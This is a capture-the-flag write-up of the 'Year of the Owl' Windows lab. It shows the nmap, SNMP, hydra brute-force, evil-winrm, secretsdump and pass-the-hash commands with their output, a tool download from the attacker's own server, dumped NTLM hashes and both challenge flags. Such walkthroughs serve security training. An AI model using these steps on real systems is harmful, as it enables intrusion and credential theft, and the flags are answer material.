# CTF Writeup: Year of the Owl

---

Mapped target_ip 10.10.26.36 to /etc/hosts

```
sudo echo "10.10.26.36 owl.htb" | sudo tee -a /etc/hosts
```

## Nmap Scan

```
nmap -n -Pn -sCV -p- owl.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 22:12 CDT
Nmap scan report for owl.htb (10.10.26.36)
Host is up (0.078s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-title: Year of the Owl
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 (OpenSSL/1.1.1g PHP/7.4.10)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-title: Year of the Owl
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-02T03:17:54+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=year-of-the-owl
| Not valid before: 2025-09-01T02:35:32
|_Not valid after:  2026-03-03T02:35:32
| rdp-ntlm-info: 
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-02T03:17:14+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-02T03:17:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 314.80 seconds
```

## Reconaissance

Since HTTP (80) and (443) https are open, I decided to inspect both of them, in the webpage itself
there is just a big owl.jpg. Which I downloaded locally and tried to extract any metadata or hidden files out of it.

```
steghide extract -sf owl.jpg                                                          
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Decided to bruteforce passphrase using stegseek.

```
stegseek -sf owl.jpg /usr/share/wordlists/rockyou.txt
```

but couldn't retrieve any passphrase.

Tried enumerating sub-domains and hidden directories, but also couldn't retrive any information.

```
gobuster dir -u http://owl.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://owl.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/examples             (Status: 503) [Size: 397]
/licenses             (Status: 403) [Size: 416]
/%20                  (Status: 403) [Size: 297]
/*checkout*           (Status: 403) [Size: 297]
/phpmyadmin           (Status: 403) [Size: 297]
/webalizer            (Status: 403) [Size: 297]
/*docroot*            (Status: 403) [Size: 297]
/*                    (Status: 403) [Size: 297]
/con                  (Status: 403) [Size: 297]
/http%3A              (Status: 403) [Size: 297]
/**http%3a            (Status: 403) [Size: 297]
/*http%3A             (Status: 403) [Size: 297]
/aux                  (Status: 403) [Size: 297]
/**http%3A            (Status: 403) [Size: 297]
/%C0                  (Status: 403) [Size: 297]
```

```
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://owl.htb -H "Host: FUZZ.owl.htb" -fs 252

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://owl.htb
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.owl.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 252
________________________________________________

:: Progress: [114442/114442] :: Job [1/1] :: 353 req/sec :: Duration: [0:04:32] :: Errors: 0 ::
```

Since HTTP/HTTPS is not the way to go inside. SMB (445) will be the next target.

Enumerating Shares utilizing smbclient & smbmap. Unfortunately they require Authentification.

```
smbclient -L \\\\owl.htb\\                     
Password for [WORKGROUP\unkn0wn]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

```
smbmap -H owl.htb          

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                 [|] Checking for open ports...                                                                 [/] Checking for open ports...                                                                 [*] Detected 1 hosts serving SMB   
[-] Initializing hosts...                                                                      [\] Authenticating...                                                                          [|] Authenticating...                                                                          [/] Authenticating...                                                                          [-] Authenticating...                                                                          [\] Authenticating...                                                                          [|] Authenticating...                                                                          [/] Authenticating...                                                                          [-] Authenticating...                                                                          [\] Authenticating...                                                                          [|] Authenticating...                                                                          [*] Established 1 SMB connections(s) and 0 authenticated session(s)
[/] Authenticating...                                                                          [-] Enumerating shares...                                                                      [!] Something weird happened on (10.10.26.36) Error occurs while reading from remote(104) on line 1015
[\] Closing connections..                                                                      [|] Closing connections..                                                                      [/] Closing connections..                                                                      [-] Closing connections..                                                                      [\] Closing connections..                                                                      [|] Closing connections..                                                                      [/] Closing connections..                                                                      [-] Closing connections..                                                                                                                                                                     [*] Closed 1 connections
```

Brute-forcing smb also didn't prompt us any informations, so I decided to move on and check
out WinRM running on 5985.

After educating myself in walkthroughs I knew the attack vector was SNMP.

Utilizing an UDP nmap scan, I was able to retrieve that an SNMP Server was up & running.

```
nmap -sU --top-ports 10 owl.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 05:10 CDT
Nmap scan report for owl.htb (10.10.38.124)
Host is up (0.033s latency).

PORT     STATE         SERVICE
53/udp   open|filtered domain
67/udp   open|filtered dhcps
123/udp  open|filtered ntp
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open|filtered snmp
445/udp  open|filtered microsoft-ds
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m

Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds
```

Decided to utilize snmp tools onesixtyone & snmpwalk to gain information & potentially creds.

```
onesixtyone -c /usr/share/SecLists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.38.124
Scanning 1 hosts, 3218 communities
10.10.38.124 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```
Utilizing snmpwalk and the OID of User Enumeration in Windows gave us User Credentials of the target.

```
snmpwalk -v 2c -c openview 10.10.38.124 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
```
Decided to bruteforce credentials, worked on rdp service.

```
hydra -l Jareth -P /usr/share/wordlists/rockyou.txt rdp://owl.htb/ -t 1 -W 3
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-02 04:53:37
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking rdp://owl.htb:3389/
[STATUS] 19.00 tries/min, 19 tries in 00:01h, 14344380 to do in 12582:48h, 1 active

[STATUS] 18.33 tries/min, 55 tries in 00:03h, 14344344 to do in 13040:19h, 1 active
[STATUS] 18.14 tries/min, 127 tries in 00:07h, 14344272 to do in 13177:10h, 1 active
[STATUS] 18.11 tries/min, 272 tries in 00:15h, 14344127 to do in 13198:36h, 1 active
[3389][rdp] account on 10.10.38.124 might be valid but account not active for remote desktop: login: Jareth password: sarah, continuing attacking the account.
[STATUS] 17.93 tries/min, 556 tries in 00:31h, 14343843 to do in 13336:17h, 1 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Gained Password of Jareth:sarah.

## Initial Access

Utilized evil-winrm to gain shell on the target server, because using rdp is to noisey

```
evil-winrm -i 10.10.38.124 -u Jareth -p sarah
```

Gained shell and retrieved user.txt flag in C:\Users\Jareth\Desktop\user.txt

```
THM{Y2I0NDJjODY2NTc2YmI2Y2U4M2IwZTBl}
```

## Privilege Escalation

Decided to utilize winPEAS

Opened up webserver locally.

```
python3 -m http.server 8000
```

```
Invoke-WebRequest -Uri "http://10.21.156.104:8000/Tools/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat" -OutFile "C:\Users\Jareth\Documents\winPEAS.bat"
```

Ran winPEAS --> it found the SID of Jareth.

Decided to explore the Recycle Bin using the SID

```
C:\Users\Jareth\Documents> cd 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001'
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir


    Directory: C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak
```

found sam.bak and system.bak and downloaded them locally.

Utilizing the tool impacket-secretsdump provided me with dumped credentials of all users.

```
impacket-secretsdump -sam /home/unkn0wn/Desktop/sam.bak -system /home/unkn0wn/Desktop/system.bak LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
[*] Cleaning up...
```

Logged in with Credentials and NTLM Hash

```
evil-winrm -i 10.10.41.46 -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a
```

Retrieved admin.txt flag in C:\Users\Administrator\Desktop\admin.txt

```
THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}
```
